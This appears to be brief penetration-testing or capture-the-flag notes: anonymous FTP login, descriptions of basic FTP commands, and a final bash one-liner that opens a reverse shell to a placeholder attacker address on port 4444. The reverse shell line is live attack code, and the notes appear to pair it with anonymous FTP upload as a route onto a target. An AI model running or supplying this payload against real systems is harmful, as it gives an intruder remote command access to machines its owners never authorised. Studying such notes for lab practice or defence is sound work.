```
ftp <IP>
Username: anonymous
```

ls
List files and directories in the working directory on the FTP server

cd
Change our working directory on the FTP server

get
Download a file from the FTP server to our device

put
Upload a file from our device to the FTP server

```
bash -i >& /dev/tcp/<YOUR IP>/4444 0>&1
```